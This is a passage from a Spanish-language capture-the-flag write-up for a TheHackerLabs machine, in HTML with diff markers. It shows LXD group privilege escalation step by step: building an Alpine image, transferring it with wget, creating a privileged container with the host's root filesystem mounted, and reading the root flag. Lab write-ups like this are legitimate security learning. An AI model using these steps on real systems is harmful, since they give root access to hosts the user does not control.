+<li>Primero, descargamos la imagen que vamos a utilizar en nuestra máquina:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone  https://github.com/saghul/lxd-alpine-builder.git
+</span></span><span style="display:flex;"><span>Clonando en <span style="color:#e6db74">&#39;lxd-alpine-builder&#39;</span>...
+</span></span><span style="display:flex;"><span>remote: Enumerating objects: 50, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Counting objects: 100% <span style="color:#f92672">(</span>8/8<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Compressing objects: 100% <span style="color:#f92672">(</span>6/6<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Total <span style="color:#ae81ff">50</span> <span style="color:#f92672">(</span>delta 2<span style="color:#f92672">)</span>, reused <span style="color:#ae81ff">5</span> <span style="color:#f92672">(</span>delta 2<span style="color:#f92672">)</span>, pack-reused <span style="color:#ae81ff">42</span> <span style="color:#f92672">(</span>from 1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Recibiendo objetos: 100% <span style="color:#f92672">(</span>50/50<span style="color:#f92672">)</span>, 3.11 MiB | 5.63 MiB/s, listo.
+</span></span><span style="display:flex;"><span>Resolviendo deltas: 100% <span style="color:#f92672">(</span>15/15<span style="color:#f92672">)</span>, listo.
+</span></span></code></pre></div><ul>
+<li>Entramos en el proyecto clonado y ahí debería estar un archivo comprimido que contiene la imagen:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  LICENSE  README.md
+</span></span></code></pre></div><ul>
+<li>En caso de que no lo tenga, ejecuta el archivo <code>build-alpine</code>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/build-alpine
+</span></span><span style="display:flex;"><span>Determining the latest release... v3.21
+</span></span><span style="display:flex;"><span>Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.21/main/x86_64
+</span></span><span style="display:flex;"><span>Downloading alpine-keys-2.5-r0.apk
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><ul>
+<li>Enviamos el archivo comprimido a la máquina víctima dentro de la sesión actual, abriendo un servidor con <strong>Python</strong> y utilizando la herramienta <strong>wget</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>concebolla@tortillapapas:~$ wget http://Tu_IP/alpine-v3.13-x86_64-20210218_0139.tar.gz
+</span></span><span style="display:flex;"><span>--2025-03-23 21:14:01--  http://Tu_IP/alpine-v3.13-x86_64-20210218_0139.tar.gz
+</span></span><span style="display:flex;"><span>Conectando con Tu_IP:80... conectado.
+</span></span><span style="display:flex;"><span>Petición HTTP enviada, esperando respuesta... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Longitud: <span style="color:#ae81ff">3259593</span> <span style="color:#f92672">(</span>3.1M<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>application/gzip<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Grabando a: «alpine-v3.13-x86_64-20210218_0139.tar.gz»
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>alpine-v3.13-x86_64-20210218_0139.tar.gz        100%<span style="color:#f92672">[================</span>&gt;<span style="color:#f92672">]</span>   3.11M  --.-KB/s    en 0.04s   
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>2025-03-23 21:14:01 <span style="color:#f92672">(</span>85.7 MB/s<span style="color:#f92672">)</span> - «alpine-v3.13-x86_64-20210218_0139.tar.gz» guardado <span style="color:#f92672">[</span>3259593/3259593<span style="color:#f92672">]</span>
+</span></span></code></pre></div><ul>
+<li>Importamos la imagen:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>concebolla@tortillapapas:~$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myImage
+</span></span><span style="display:flex;"><span>Image imported with fingerprint: cd73881adaac667...
+</span></span></code></pre></div><p>Nota: aquí había descubierto que existe la misma imagen dentro de la máquina víctima, por lo que, para probar este método, decidí eliminarla con el comando <code>lxc image delete myimage</code>.</p>
+<ul>
+<li>Revisamos que la imagen esté instalada:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>concebolla@tortillapapas:~$ lxc image list
+</span></span><span style="display:flex;"><span>+---------+--------------+--------+---------------------------------------------+--------------+-----------+----------+-------------------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|  ALIAS  | FINGERPRINT  | PUBLIC |                 DESCRIPTION                 | ARCHITECTURE |   TYPE    |   SIZE   |          UPLOAD DATE          |
+</span></span><span style="display:flex;"><span>+---------+--------------+--------+---------------------------------------------+--------------+-----------+----------+-------------------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| myimage | cd73881adaac | no     | alpine v3.13 <span style="color:#f92672">(</span>20210218_01:39<span style="color:#f92672">)</span>               | x86_64       | CONTAINER | 3.11MB   | Apr 15, <span style="color:#ae81ff">2024</span> at 11:22am <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)</span> |
+</span></span><span style="display:flex;"><span>+---------+--------------+--------+---------------------------------------------+--------------+-----------+----------+-------------------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|         | 712a58368655 | no     | ubuntu 16.04 LTS amd64 <span style="color:#f92672">(</span>release<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>20211001<span style="color:#f92672">)</span> | x86_64       | CONTAINER | 171.55MB | Mar 23, <span style="color:#ae81ff">2025</span> at 7:38am <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)</span>  |
+</span></span><span style="display:flex;"><span>+---------+--------------+--------+---------------------------------------------+--------------+-----------+----------+-------------------------------+
+</span></span></code></pre></div><p>La otra imagen que aparece ahí, es del ejemplo anterior donde ocupamos internet.</p>
+<ul>
+<li>Creando un <strong>contenedor LXC</strong>(<code>lxc init</code>) llamado <strong>hackeado</strong> (nombre del contenedor) basado en la imagen <strong>Alpine</strong> que descargamos desde nuestra máquina y configurándolo como privilegiado (<code>-c security.privileged=true</code>):</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>concebolla@tortillapapas:~$ lxc init myImage hackeado -c security.privileged<span style="color:#f92672">=</span>true
+</span></span><span style="display:flex;"><span>Creating hackeado
+</span></span></code></pre></div><ul>
+<li>Revisamos que se haya creado el contenedor:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>concebolla@tortillapapas:~$ lxc ls
+</span></span><span style="display:flex;"><span>+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|   NAME   |  STATE  |        IPV4         |                     IPV6                      |   TYPE    | SNAPSHOTS |
+</span></span><span style="display:flex;"><span>+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| hackeado | STOPPED |                     |                                               | CONTAINER | <span style="color:#ae81ff">0</span>         |
+</span></span><span style="display:flex;"><span>+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ignite   | RUNNING |        XXXX  <span style="color:#f92672">(</span>eth0<span style="color:#f92672">)</span> |                     XXXX               <span style="color:#f92672">(</span>eth0<span style="color:#f92672">)</span> | CONTAINER | <span style="color:#ae81ff">0</span>         |
+</span></span><span style="display:flex;"><span>+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| test     | RUNNING |                     |                     XXXX               <span style="color:#f92672">(</span>eth0<span style="color:#f92672">)</span> | CONTAINER | <span style="color:#ae81ff">0</span>         |
+</span></span><span style="display:flex;"><span>+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+
+</span></span></code></pre></div><p>Ahí está el contenedor del ejemplo anterior.</p>
+<ul>
+<li>Montando el sistema de archivos del host dentro del <strong>contenedor LXC</strong> llamado <strong>hackeado</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>concebolla@tortillapapas:~$ lxc config device add hackeado hack2 disk source<span style="color:#f92672">=</span>/ path<span style="color:#f92672">=</span>/mnt/root recursive<span style="color:#f92672">=</span>true
+</span></span><span style="display:flex;"><span>Device hack2 added to hackeado
+</span></span></code></pre></div><p>Aquí <code>lxc config device add</code> agrega un dispositivo al <strong>contenedor hackeado</strong>, el nombre <strong>hackeado</strong> es el que se le asignó al dispositivo agregado, <strong>disk</strong> define el tipo de dispositivo siendo este caso un <strong>disco (filesystem)</strong>, <code>source=/</code> crea la montura de la raíz del host dentro del contenedor, <code>path=/mnt/root</code> indica que la montura quedara dentro del contenedor en la ruta <code>/mnt/root</code>, y por último recursive=true incluye todo el contenido de <code>/</code>, permitiendo el acceso recursivo a todos los archivos y subdirectorios.</p>
+<ul>
+<li>Iniciando el contenedor y listando los contenedores activos:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>concebolla@tortillapapas:~$ lxc start hackeado
+</span></span><span style="display:flex;"><span>concebolla@tortillapapas:~$ lxc ls
+</span></span><span style="display:flex;"><span>+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|   NAME   |  STATE  |        IPV4         |                     IPV6                      |   TYPE    | SNAPSHOTS |
+</span></span><span style="display:flex;"><span>+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| hackeado | RUNNING |        XXXX  <span style="color:#f92672">(</span>eth0<span style="color:#f92672">)</span> |                     XXXX               <span style="color:#f92672">(</span>eth0<span style="color:#f92672">)</span> | CONTAINER | <span style="color:#ae81ff">0</span>         |
+</span></span><span style="display:flex;"><span>+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ignite   | RUNNING |        XXXX  <span style="color:#f92672">(</span>eth0<span style="color:#f92672">)</span> |                     XXXX               <span style="color:#f92672">(</span>eth0<span style="color:#f92672">)</span> | CONTAINER | <span style="color:#ae81ff">0</span>         |
+</span></span><span style="display:flex;"><span>+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| test     | RUNNING |                     |                     XXXX               <span style="color:#f92672">(</span>eth0<span style="color:#f92672">)</span> | CONTAINER | <span style="color:#ae81ff">0</span>         |
+</span></span><span style="display:flex;"><span>+----------+---------+---------------------+-----------------------------------------------+-----------+-----------+
+</span></span></code></pre></div><ul>
+<li>Ejecutando una sesión Shell dentro del <strong>contenedor hackeado</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>concebolla@tortillapapas:~$ lxc exec hackeado -- /bin/sh
+</span></span><span style="display:flex;"><span>~ <span style="color:#75715e"># whoami</span>
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>En este caso, no podremos obtener una <strong>sesión de Bash</strong> por el tipo de imagen que usamos.</p>
+<ul>
+<li>Podemos ver los mismos archivos del <strong>Root</strong> de la máquina víctima y podemos volver a obtener la <strong>flag del Root</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~ <span style="color:#75715e"># cd /mnt/root/root</span>
+</span></span><span style="display:flex;"><span>/mnt/root/root <span style="color:#75715e"># ls -la</span>
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">36</span>
+</span></span><span style="display:flex;"><span>drwx------    <span style="color:#ae81ff">4</span> root     root          <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2024</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x   <span style="color:#ae81ff">18</span> root     root          <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx    <span style="color:#ae81ff">1</span> root     root             <span style="color:#ae81ff">9</span> Apr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2024</span> .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> root     root           <span style="color:#ae81ff">571</span> Apr <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2021</span> .bashrc
+</span></span><span style="display:flex;"><span>-rw-------    <span style="color:#ae81ff">1</span> root     root            <span style="color:#ae81ff">20</span> Apr <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2024</span> .lesshst
+</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">3</span> root     root          <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2024</span> .local
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> root     root           <span style="color:#ae81ff">161</span> Jul  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> .profile
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> root     root            <span style="color:#ae81ff">66</span> Apr <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2024</span> .selected_editor
+</span></span><span style="display:flex;"><span>drwx------    <span style="color:#ae81ff">2</span> root     root          <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2024</span> .ssh
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> root     root            <span style="color:#ae81ff">33</span> Apr <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2024</span> root.txt
+</span></span><span style="display:flex;"><span>/mnt/root/root <span style="color:#75715e"># cat root.txt</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Y con esto, completamos la máquina.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://bugs.gentoo.org/602652" target="_blank" rel="noopener noreferrer">https://bugs.gentoo.org/602652</a></li><li><a href="https://www.tenable.com/plugins/nessus/165443" target="_blank" rel="noopener noreferrer">https://www.tenable.com/plugins/nessus/165443</a></li><li><a href="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=LFI#basic-lfi-and-bypasses" target="_blank" rel="noopener noreferrer">https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=LFI#basic-lfi-and-bypasses</a></li><li><a href="https://github.com/kurobeats/fimap" target="_blank" rel="noopener noreferrer">https://github.com/kurobeats/fimap</a></li><li><a href="https://medium.verylazytech.com/shell-escapes-cheatsheet-214f05ae777e" target="_blank" rel="noopener noreferrer">https://medium.verylazytech.com/shell-escapes-cheatsheet-214f05ae777e</a></li><li><a href="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/escaping-from-limited-bash.html#bash-jails" target="_blank" rel="noopener noreferrer">https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/escaping-from-limited-bash.html#bash-jails</a></li><li><a href="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html?highlight=lxd#method-1" target="_blank" rel="noopener noreferrer">https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html?highlight=lxd#method-1</a></li><li><a href="https://medium.com/@mstrbgn/privilege-escalation-using-lxd-lxc-group-assignment-to-a-user-a-security-misconfiguration-a4892f611d6f" target="_blank" rel="noopener noreferrer">https://medium.com/@mstrbgn/privilege-escalation-using-lxd-lxc-group-assignment-to-a-user-a-security-misconfiguration-a4892f611d6f</a></li><li><a href="https://www.hackingarticles.in/lxd-privilege-escalation/" target="_blank" rel="noopener noreferrer">https://www.hackingarticles.in/lxd-privilege-escalation/</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/THL-writeup-espetoMalaquenio/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Espeto Malaqueño - TheHackerLabs</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/THL-writeup-jaulaCon/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">JaulaCon - TheHackerLabs</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
